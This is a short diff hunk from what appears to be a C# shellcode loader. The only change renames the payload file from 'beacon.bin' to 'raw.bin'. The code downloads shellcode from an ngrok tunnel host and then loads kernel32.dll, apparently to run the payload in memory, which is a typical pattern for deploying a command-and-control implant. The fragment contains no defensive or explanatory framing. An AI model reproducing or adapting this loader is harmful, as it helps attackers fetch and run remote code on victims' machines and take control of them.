@@ -27,7 +27,7 @@
                     using (var client = new WebClient())
                     {
                         client.BaseAddress = "http://immune-gopher-finer.ngrok-free.app";
-                        shellcode = client.DownloadData("beacon.bin");
+                        shellcode = client.DownloadData("raw.bin");
                     }
       
                     var hKernel = LoadLibrary("kernel32.dll");
